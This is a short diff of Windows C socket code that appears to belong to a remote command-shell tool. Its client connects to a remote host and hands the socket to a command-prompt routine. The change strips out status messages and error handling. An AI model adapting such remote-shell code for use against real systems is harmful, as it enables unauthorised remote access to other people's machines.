@@ -58,8 +58,6 @@ int server(int port){
     bind(server, (SOCKADDR *)&serverAddr, sizeof(serverAddr));
     listen(server, 0);
 
-    printf("Listening for incoming connections...\n");
-
     char buffer[1024];
     int clientAddrSize = sizeof(clientAddr);
     client = accept(server, (SOCKADDR *)&clientAddr, &clientAddrSize);
@@ -79,28 +77,13 @@ int client(char *rhost, int port){
     SOCKET s, client;
     struct sockaddr_in server;
 
-    printf("\nInitialising Winsock...");
-    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
-    {
-        printf("Failed. Error Code : %d",WSAGetLastError());
-        return 1;
-    }
-
-    printf("Initialised.\n");
-
-    //Create a socket
-    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
-    {
-        printf("Could not create socket : %d" , WSAGetLastError());
-    }
-
-    printf("Socket created.\n");
-
+    
+    WSAStartup(MAKEWORD(2,2),&wsa);
+    s = socket(AF_INET , SOCK_STREAM , 0 );
     server.sin_addr.s_addr = inet_addr(rhost);
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
 
-    //Connect to remote server
     client = connect(s, (struct sockaddr *)&server , sizeof(server));
     header(s);
     command_prompt(s);
